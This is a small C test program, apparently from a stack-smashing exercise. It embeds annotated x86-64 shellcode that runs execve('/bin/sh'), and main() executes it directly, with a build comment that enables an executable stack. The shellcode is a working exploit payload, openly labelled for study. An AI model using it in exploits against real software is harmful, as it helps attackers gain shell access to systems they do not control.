#include <stdio.h>
#include <string.h>

/**
 * clang -z execstack -o smashing_shellcode_test smashing_shellcode_test.c
 * ./smashing_shellcode_test
 */
char shellcode[] =
  "\xeb\x17"             // jmp <push_str>
  "\x5f"                 // <pop_str>: pop %rdi
  "\x48\x31\xd2"         // xor    %rdx,%rdx
  "\x48\x31\xc0"         // xor    %rax,%rax
  "\x48\x89\xe6"         // mov    %rsp,%rsi
  "\x48\x89\x54\x24\x08" // mov    %rdx,0x8(%rsp)
  "\x48\x89\x3c\x24"     // mov    %rdi,(%rsp)
  "\xb0\x3b"             // mov    $0x3b,%al
  "\x0f\x05"             // syscall
  "\xe8\xe4\xff\xff\xff" // <push_str>: callq <pop_str>
  "/bin/sh";

int main() {
  printf("len:%lu bytes\n", strlen(shellcode));
  (*(void (*)())shellcode)();
  return 0;
}
